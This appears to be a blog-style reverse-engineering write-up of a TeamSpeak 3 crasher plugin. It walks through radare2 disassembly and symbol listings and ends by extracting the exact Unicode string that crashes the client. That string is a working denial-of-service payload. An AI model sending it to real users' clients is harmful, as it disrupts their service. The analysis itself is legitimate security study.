R4P3 TS3 Crash Analysis
-------

by th0razine | <th0razine@protonmail.ch>

A few days prior, the developers/reverse engineers released a crash exploit and mitigation on their forums. I decided to reverse it to see what exactly was going on. The first step was to download the TS3 plugin package. Quickly running `file` on the file reveals that the TS3 plugin package container is simply a .zip file. Extracting the files reveals two .dll files, each for a specific arch (i686 and x86_64). Let's try opening it up in radare2.
```
[0x180001a84]> pdf @ entry0

/ (fcn) entry0 61
|          ;-- entry0:
|          0x180001a84    48895c2408     mov qword [rsp + 8], rbx       ; [0x8:8]=0xffff00000004
|          0x180001a89    4889742410     mov qword [rsp + 0x10], rsi    ; [0x10:8]=184
|          0x180001a8e    57             push rdi
|          0x180001a8f    4883ec20       sub rsp, 0x20
|          0x180001a93    498bf8         mov rdi, r8
|          0x180001a96    8bda           mov ebx, edx
|          0x180001a98    488bf1         mov rsi, rcx
|          0x180001a9b    83fa01         cmp edx, 1
|      ,=< 0x180001a9e    7505           jne 0x180001aa5
|      |   0x180001aa0    e897060000     call fcn.18000213c
|      |     ^- fcn.18000213c()
|      |   ; JMP XREF from 0x180001a9e (entry0)
|      `-> 0x180001aa5    4c8bc7         mov r8, rdi
|          0x180001aa8    8bd3           mov edx, ebx
|          0x180001aaa    488bce         mov rcx, rsi
|          0x180001aad    488b5c2430     mov rbx, qword [rsp + 0x30]    ; [0x30:8]=0 ; '0'
|          0x180001ab2    488b742438     mov rsi, qword [rsp + 0x38]    ; [0x38:8]=0x10800000000  ; '8'
|          0x180001ab7    4883c420       add rsp, 0x20
|          0x180001abb    5f             pop rdi
\          0x180001abc    e953feffff     jmp 0x180001914
[0x180001a84]> 
```

Nothing too interesting here. Let's see if we can get anything useful from rabin2.

```
$ rabin2 -s R4P3_Crasher_3_0_19_win64.dll
[Symbols]
vaddr=0x00001260 paddr=0x00000660 ord=000 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_apiVersion
vaddr=0x00001270 paddr=0x00000670 ord=001 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_author
vaddr=0x00001290 paddr=0x00000690 ord=002 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_commandKeyword
vaddr=0x00001280 paddr=0x00000680 ord=003 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_description
vaddr=0x00001670 paddr=0x00000a70 ord=004 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_freeMemory
vaddr=0x000012a0 paddr=0x000006a0 ord=005 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_init
vaddr=0x00001330 paddr=0x00000730 ord=006 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_initMenus
vaddr=0x00001240 paddr=0x00000640 ord=007 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_name
vaddr=0x000013b0 paddr=0x000007b0 ord=008 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_onMenuItemEvent
vaddr=0x00001550 paddr=0x00000950 ord=009 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_onTextMessageEvent
vaddr=0x000011f0 paddr=0x000005f0 ord=010 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_registerPluginID
vaddr=0x00001320 paddr=0x00000720 ord=011 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_requestAutoload
vaddr=0x000012b0 paddr=0x000006b0 ord=012 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_setFunctionPointers
vaddr=0x00001620 paddr=0x00000a20 ord=013 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_shutdown
vaddr=0x00001250 paddr=0x00000650 ord=014 fwd=NONE sz=0 bind=NONE type=FUNC name=Crash3019.dll_ts3plugin_version
```

Now we're getting somewhere. Refer to the following image.
![R4P3 Crash Screenshot]
(https://i.imgur.com/W3XbFQg.png)

It seems like what we want is in `Crash3019.dll_ts3plugin_onMenuItemEvent`

```
[0x180001a84]> pd 32 @ sym.Crash3019.dll_ts3plugin_onMenuItemEvent
            ;-- sym.Crash3019.dll_ts3plugin_onMenuItemEvent:
            0x1800013b0    48895c2418     mov qword [rsp + 0x18], rbx   ; [0x18:8]=64
            0x1800013b5    56             push rsi
            0x1800013b6    4881ec700100.  sub rsp, 0x170
            0x1800013bd    488b053c9c01.  mov rax, qword [rip + 0x19c3c]  ; [0x18001b000:8]=0x2b992ddfa232  ; "2..-.+" @ 0x18001b000
            0x1800013c4    4833c4         xor rax, rsp
            0x1800013c7    488984246001.  mov qword [rsp + 0x160], rax  ; [0x160:8]=0x160000200000000
            0x1800013cf    498bd9         mov rbx, r9
            0x1800013d2    488bf1         mov rsi, rcx
            0x1800013d5    83ea01         sub edx, 1
        ,=< 0x1800013d8    743c           je 0x180001416
        |   0x1800013da    83fa01         cmp edx, 1
       ,==< 0x1800013dd    0f8546010000   jne 0x180001529
       ||   0x1800013e3    443bc2         cmp r8d, edx
      ,===< 0x1800013e6    752e           jne 0x180001416
      |||   0x1800013e8    4533c9         xor r9d, r9d
      |||   0x1800013eb    488d15767a01.  lea rdx, [rip + 0x17a76]      ; 0x180018e68
      |||   0x1800013f2    440fb7c3       movzx r8d, bx
      |||   0x1800013f6    ff15c4b80100   call qword [rip + 0x1b8c4] ;unk() ; section_end..reloc
      |||   0x1800013fc    85c0           test eax, eax
     ,====< 0x1800013fe    0f8425010000   je 0x180001529
     ||||   0x180001404    488d0d957901.  lea rcx, [rip + 0x17995]      ; 0x180018da0 ; str._n_b__R4P3.NET___b___color_red__b__ERROR___b___color____Unable_to_send_Private_Message_to_user__n ; str._n_b__R4P3.NET___b___color_red__b__ERROR___b___color____Unable_to_send_Private_Message_to_user__n
     ||||   0x18000140b    ff15c7bc0100   call qword [rip + 0x1bcc7] ;unk() ; section_end..reloc
    ,=====< 0x180001411    e913010000     jmp 0x180001529
    ||`-`-> 0x180001416    4183f802       cmp r8d, 2
   ,======< 0x18000141a    0f8509010000   jne 0x180001529
   ||| |    0x180001420    488d542420     lea rdx, [rsp + 0x20]         ; 0x20
   ||| |    0x180001425    ff152db90100   call qword [rip + 0x1b92d] ;unk() ; section_end..reloc
   ||| |    0x18000142b    0fb7542420     movzx edx, word [rsp + 0x20]  ; [0x20:2]=0
   ||| |    0x180001430    4c8d442430     lea r8, [rsp + 0x30]          ; 0x30  ; '0'
   ||| |    0x180001435    488bce         mov rcx, rsi
   ||| |    0x180001438    ff156ab90100   call qword [rip + 0x1b96a] ;unk() ; section_end..reloc
   ||| |    0x18000143e    4c8b442430     mov r8, qword [rsp + 0x30]    ; [0x30:8]=0 ; '0'
[0x180001a84]> ps @ 0x180018e68
\xe1\x97\xaa
\xe0\xbc\xbf
[0x180001a84]> ps @ 0x2b992ddfa232
\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff
```

The 'string' at  0x2b992ddfa232 is obviously some type of padding. I'm not too keen as to why this padding exists, but it could be leftover code from the devs attempting a remote code execution.

The string at 0x180018e68, however, seems to be the culprit for the crash. We can determine the string via Python.

```
$ python -c "print '\xe1\x97\xaa\xe0\xbc\xbf'"
ᗪ༿
```
And there we go. We've successfully reverse engineered the exploit in order to get the string causing the crash. Simple enough, though the existence of padding may be evidence as to trying to make this more than a simple DoS.

th0razine | <th0razine@protonmail.ch>


